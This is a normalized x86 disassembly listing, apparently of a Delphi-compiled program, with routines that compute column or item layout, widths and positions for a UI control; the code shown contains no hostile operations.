mov edx [ esp ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x94 ]
mov ebx eax
test bl bl
jne r-xdata
sub_4839fc
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x2e8 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov al 0x1
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x94 ]
test al al
je r-xdata
mov edx edi
mov eax ebp
call sub_483fd0
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_483a4c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xe0 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_484998
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_47c144
cmp al 0x2
jne r-xdata
mov al [ ebp + 0x8 ]
mov eax esi
call sub_480b24
test al al
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0x2e8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp - 0x19 ] 0x1
mov eax [ ebx + 0x2e8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
test esi esi
je r-xdata
mov al [ ebp + 0x8 ]
xor al 0x1
jmp r-xdata
mov al [ ebp + 0x8 ]
jmp r-xdata
fild [ ebx + 0x33c ]
fadd [ r-xdata ]
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xbfe00000
jmp r-xdata
fld [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc edi
xor esi esi
inc edi
mov [ ebp - 0x14 ] 0x0
mov eax esi
call sub_481f8c
test eax eax
jle r-xdata
cmp [ ebx + 0x334 ] 0x0
setg dl
test dl al
je r-xdata
inc esi
dec edi
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax esi
call sub_481f8c
test eax eax
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4839fc
test al al
je r-xdata
mov edi [ ebx + 0x330 ]
dec edi
imul edi [ ebx + 0x334 ]
mov eax esi
call sub_481f8c
mov [ ebp - 0x18 ] eax
cmp edi [ ebp - 0x18 ]
jl r-xdata
mov edx esi
mov eax ebx
call sub_483fd0
cmp [ eax + 0x30 ] 0x0
je r-xdata
jmp r-xdata
mov edx [ eax ]
call [ edx + 0xc8 ]
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
mov edx [ eax ]
call [ edx + 0xd4 ]
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
inc [ ebp - 0x14 ]
dec edi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ecx [ ebx + 0x334 ]
mov eax ecx
add eax edi
dec eax
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x2c ]
jg r-xdata
mov eax [ ebp - 0x18 ]
cdq
idiv [ ebx + 0x334 ]
mov edx eax
dec edx
xor eax eax
call sub_476954
mov edi eax
imul edi [ ebx + 0x334 ]
mov edx [ ebp - 0x14 ]
mov eax ebx
call sub_483fd0
mov esi eax
cmp [ esi + 0x30 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ esi + 0x90 ] 0x2
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
cdq
idiv ecx
add edx edi
dec edx
mov [ ebp - 0x2c ] edx
cmp [ esi + 0xa0 ] 0x2
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ esi + 0x50 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov ecx [ ebp - 0x2c ]
mov dl [ ebp + 0x8 ]
mov eax esi
call sub_48120c
fstp [ ebp - 0x10 ]
fwait
cmp [ ebx + 0x338 ] 0x0
jne r-xdata
mov ecx edi
mov dl [ ebp + 0x8 ]
mov eax esi
call sub_48120c
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
mov eax [ esi + 0x54 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x2c ]
sub eax edi
inc eax
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x30 ]
cmp eax [ ebx + 0x334 ]
jge r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
fstp [ ebp - 0x28 ]
fwait
mov eax esi
mov edx [ eax ]
call [ edx + 0xc0 ]
fstp [ ebp - 0x28 ]
fwait
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xd0 ]
fstp [ ebp - 0x28 ]
fwait
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
fstp [ ebp - 0x28 ]
fwait
jmp r-xdata
mov ecx edi
mov dl [ ebp + 0x8 ]
mov eax esi
call sub_48120c
fstp [ ebp - 0x28 ]
fwait
fld [ ebp - 0x10 ]
fsub [ ebp - 0x28 ]
fild [ ebx + 0x334 ]
fmulp st1
fild [ ebp - 0x30 ]
fdivp st1
fadd [ ebp - 0x28 ]
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x19 ] 0x0
cmp [ ebp - 0x5 ] 0x0
je r-xdata
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
fld [ ebp - 0x28 ]
fcomp [ ebp - 0x10 ]
fnstsw ax
sahf
jb r-xdata
fld [ ebp - 0x28 ]
fcomp [ ebp - 0x10 ]
fnstsw ax
sahf
jbe r-xdata
sub_483dc4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
xor ebp ebp
mov eax [ edi + 0x2e8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_483fd0
cmp [ eax + 0x30 ] 0x0
je r-xdata
cmp ebp [ esp ]
jne r-xdata
inc ebp
mov edx esi
mov eax edi
call sub_483fd0
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_483e14
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
xor edx edx
push ebp
push j_sub_403a98#5
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx edi
call sub_483dc4
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_404094
cmp [ ebx + 0x78 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x78 ]
call sub_4040e8
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4040e8
cmp [ esi ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_483e9b
lea eax [ ebp - 0x4 ]
call sub_404094
retn
lea edx [ ebp - 0x4 ]
mov eax edi
call sub_408200
mov ecx [ ebp - 0x4 ]
mov eax esi
mov edx r-xdata
call sub_4043a0
jmp r-xdata
sub_483eb4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403a98#4
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2e8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_483f76
lea eax [ ebp - 0x1c ]
call sub_404094
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax esi
call sub_481f8c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_483fd0
mov esi eax
mov eax [ esi + 0x88 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
mov [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0x60 ]
mov edx [ ebp - 0x1c ]
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_477be4
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_476954
mov [ ebp - 0x8 ] eax
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_483f80
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x2e8 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_483194
mov edx eax
mov eax [ esp ]
call sub_476954
mov [ esp ] eax
mov edx edi
mov eax ebp
call sub_483fd0
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
je r-xdata
sub_483fe8
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
cmp [ ebx + 0x278 ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x340 ] eax
xor eax eax
mov [ ebx + 0x344 ] eax
xor eax eax
mov [ ebx + 0x280 ] eax
xor eax eax
mov [ ebx + 0x254 ] eax
fild [ ebx + 0x228 ]
fld [ r-xdata ]
fmulp st1
fstp [ esp ]
fwait
mov eax [ ebx + 0x27c ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
fild [ ebx + 0x240 ]
fmul [ esp ]
call sub_402b00
mov esi eax
mov [ ebx + 0x340 ] esi
mov [ ebx + 0x344 ] esi
cmp [ ebx + 0x22c ] 0x0
je r-xdata
fld [ esp ]
fmul [ r-xdata ]
fstp [ esp ]
fwait
mov eax 0x1
mov edx [ ebx + 0x33c ]
inc edx
mov eax 0x1
call sub_476954
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov edx [ ebx + 0x344 ]
imul edx eax
mov [ ebx + 0x254 ] edx
mov edx [ ebx + 0x340 ]
imul edx eax
mov [ ebx + 0x280 ] edx
jmp r-xdata
sub_4840bc
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4779bc
test al al
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x280 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
lea edx [ eax + 0x28e ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x288 ]
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0xc0 ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1 ] 0x1
sub_484114
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x288 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1 ] 0x0
sub_484140
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_4834d4
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4834d4
cmp esi eax
jne r-xdata
mov eax ebx
call sub_481f8c
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
sub_484188
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x8 ]
mov edi [ edi + 0x8 ]
add edi 0xfffffffc
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x2e8 ]
call sub_414418
mov ebx eax
mov eax [ edi ]
mov eax [ eax + 0x2e8 ]
mov esi [ eax + 0x8 ]
dec esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_481f8c
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub esi ebx
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10c ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xchg esi ebx
sub ebx esi
jg r-xdata
sub esi ebx
jl r-xdata
push ebp
mov eax [ edi ]
mov edx esi
call sub_483fd0
call sub_484140
pop ecx
inc esi
dec ebx
jne r-xdata
dec ebx
inc esi
xchg esi ebx
push ebp
mov eax [ edi ]
mov edx esi
call sub_483fd0
call sub_484140
pop ecx
dec esi
inc ebx
jne r-xdata
jmp r-xdata
push ebp
mov eax [ edi ]
mov edx esi
call sub_483fd0
call sub_484140
pop ecx
inc esi
dec ebx
jne r-xdata
jmp r-xdata
sub_48423c
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x64 ]
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x11 ] 0x0
je r-xdata
mov eax esi
call sub_481abc
cmp [ ebx + 0x11 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_4840bc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_484114
pop ecx
sub_484278
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x278 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4812b8
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4c ] 0xffffffff
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x70 ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x301 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_481a10
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x50 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x301 ] 0x0
je r-xdata
push ebp
call sub_4840bc
pop ecx
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2e8 ]
mov edx [ ebp - 0x8 ]
call sub_414418
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2e8 ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
push ebp
mov eax [ ebp - 0x8 ]
call sub_48423c
pop ecx
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
push ebp
call sub_484114
pop ecx
cmp [ ebp - 0xc ] 0xffffffff
je r-xdata
inc ebx
push ebp
call sub_484114
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2e8 ]
mov edx [ ebp - 0x8 ]
call sub_414418
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2e8 ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x108 ]
test al al
je r-xdata
inc esi
dec ebx
jne r-xdata
mov eax edi
call sub_4834d4
push eax
mov eax [ ebp - 0x8 ]
call sub_4834d4
pop edx
cmp edx eax
jne r-xdata
inc ebx
mov esi [ ebp - 0x10 ]
mov ebx [ ebp - 0xc ]
sub ebx esi
jg r-xdata
mov esi [ ebp - 0xc ]
mov ebx [ ebp - 0x10 ]
sub ebx esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_483fd0
mov edi eax
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov eax edi
call sub_4812b8
mov eax [ edi + 0x4c ]
cmp eax 0xffffffff
je r-xdata
inc esi
dec ebx
jne r-xdata
mov eax edi
call sub_4834d4
push eax
mov eax [ ebp - 0x8 ]
call sub_4834d4
pop edx
cmp edx eax
jne r-xdata
dec ebx
inc ebx
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_483fd0
mov edi eax
cmp [ edi + 0x30 ] 0x0
je r-xdata
jmp r-xdata
cmp [ edi + 0x4c ] 0xffffffff
je r-xdata
push ebp
mov eax esi
call sub_484188
pop ecx
dec esi
inc ebx
jne r-xdata
push ebp
mov eax esi
call sub_484188
pop ecx
inc esi
dec ebx
jne r-xdata
jmp r-xdata
mov edx eax
mov eax [ ebp - 0xc ]
call sub_476954
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] eax
jmp r-xdata
push ebp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_483fd0
call sub_48423c
pop ecx
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
mov edx [ edi + 0x5c ]
mov eax [ ebp - 0x10 ]
call sub_476954
mov [ ebp - 0x10 ] eax
mov eax [ edi + 0x5c ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x301 ] 0x0
je r-xdata
push ebp
call sub_4840bc
pop ecx
sub_4844c8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor edx edx
mov [ eax + 0x33c ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2e8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x278 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x33c ] 0xffffffff
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2e8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x278 ] 0x0
je r-xdata
inc ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx edi
call sub_483fd0
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0xf4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22c ] 0x0
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx [ eax ]
call [ edx + 0x114 ]
mov eax esi
call sub_4834d4
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x33c ]
sub edx eax
mov [ esi + 0xf4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx edi
call sub_483fd0
cmp [ eax + 0x30 ] 0x0
je r-xdata
sub_4845b8
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2e8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x340 ]
imul edx [ eax + 0xf4 ]
mov [ eax + 0xfc ] edx
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
mov ecx [ ecx + 0x340 ]
add ecx edx
mov [ eax + 0x104 ] ecx
mov edx [ eax + 0xfc ]
add edx ecx
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_483fd0
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov [ eax + 0x100 ] edx
mov ecx [ eax + 0x64 ]
mov [ ecx + 0x2c ] edx
adc edx 0x0
sub_484638
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x322 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x348 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebx + 0x324 ]
call [ ebx + 0x320 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dl 0x1
mov eax ebx
call sub_47ec1c
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4143bc
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_483960
test al al
je r-xdata
sub_4846b4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xec ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2e8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xfc ]
push ebp
call sub_4844c8
pop ecx
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xf0 ]
push ebp
call sub_4845b8
pop ecx
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xf4 ]
mov eax [ ebp - 0x4 ]
add eax 0x28e
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x22d ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x280 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov ebx [ eax ]
call [ ebx + 0xb0 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov edx [ eax ]
call [ edx + 0x98 ]
test al al
je r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x100 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x302 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
lea esi [ eax + 0x28e ]
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
lea esi [ eax + 0x22d ]
lea edi [ edx + 0x28e ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xfc ]
mov eax [ ebp - 0x4 ]
lea edi [ eax + 0x28e ]
lea esi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
inc esi
dec ebx
jne r-xdata
mov edx [ eax ]
call [ edx + 0x48 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32a ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_483fd0
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2e8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x32c ]
call [ ebx + 0x328 ]
push ebp
call sub_484638
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x302 ] 0x0
je r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x284 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
push ebp
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_483fd0
call sub_484278
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
call sub_472e1c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2ca ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_477e28
push ebp
call sub_484638
pop ecx
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_483fd0
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_4848a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_449328
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2e8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2e8 ]
mov edx esi
call sub_4834ec
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_484940
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ esi + 0x2e8 ]
call sub_414418
mov edi eax
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_480d80
xor eax eax
mov [ ebx + 0x68 ] eax
mov ax [ esi + 0x78 ]
cmp ax [ ebx + 0x44 ]
jne r-xdata
mov edx edi
mov eax [ esi + 0x2e8 ]
call sub_41425c
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
mov dx [ esi + 0x268 ]
mov eax esi
call sub_44275c
sub_484998
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov esi eax
mov eax [ esi + 0x2e8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
xor ebx ebx
inc edi
mov [ esp ] 0x0
mov edx ebp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x94 ]
test al al
jne r-xdata
mov edx ebp
mov eax esi
call sub_4839fc
test al al
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp ]
dec edi
jne r-xdata
mov edx [ esp ]
mov eax esi
call sub_483fd0
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
sub_484a00
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov edi eax
xor ebx ebx
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov cl [ esp ]
mov edx esi
mov eax edi
